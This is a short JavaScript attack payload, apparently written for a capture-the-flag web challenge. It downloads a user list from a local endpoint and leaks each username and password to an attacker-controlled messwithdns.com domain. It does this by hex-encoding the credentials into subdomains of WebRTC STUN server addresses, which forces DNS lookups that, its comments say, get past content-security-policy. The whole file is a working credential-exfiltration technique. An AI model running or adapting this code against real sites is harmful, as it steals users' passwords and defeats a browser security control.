//The to hex function was copied from:
//https://www.tutorialspoint.com/article/converting-ascii-to-hexadecimal-in-javascript
const toHex = (str = '') => {
    return str.split('').map(char => char.charCodeAt(0).toString(16)).join('');
}

//if no DNS queries are recieved on messwithdns.com, just refresh the domain and use the new x.messwithdns.com. 
//Caching seems to make it so the queries never makes it past the router. 
fetch("http://localhost:3000/download/users") //download users
  .then(x => x.text())
  .then(async text => {
    const parsed = JSON.parse(text);

    for (const user of parsed) {
      console.log(user.username) //debug in console 
      console.log(user.password)
      //this triggers a DNS resolution. webRTC is not blocked by content-security-policy!
      const p = new RTCPeerConnection({
        iceServers: [
          {
            urls: //craft the iceserver adresses 
              "stun:" + user.username.toLowerCase() + "." + //has to be lowercase otherwise not sent
              toHex(user.username) + //needs to be lowercase but we want to know which letters are uppercase, so hex encode!
              "." +
              toHex(user.password) +
              ".ogre416.messwithdns.com" //change this to whatever the messwithdns.com is currently. 
          }
        ]
      });

      p.createDataChannel("d");
      await p.setLocalDescription();
    }
  });
  // This script will send the flag as the subdomain of attacker controlled domain
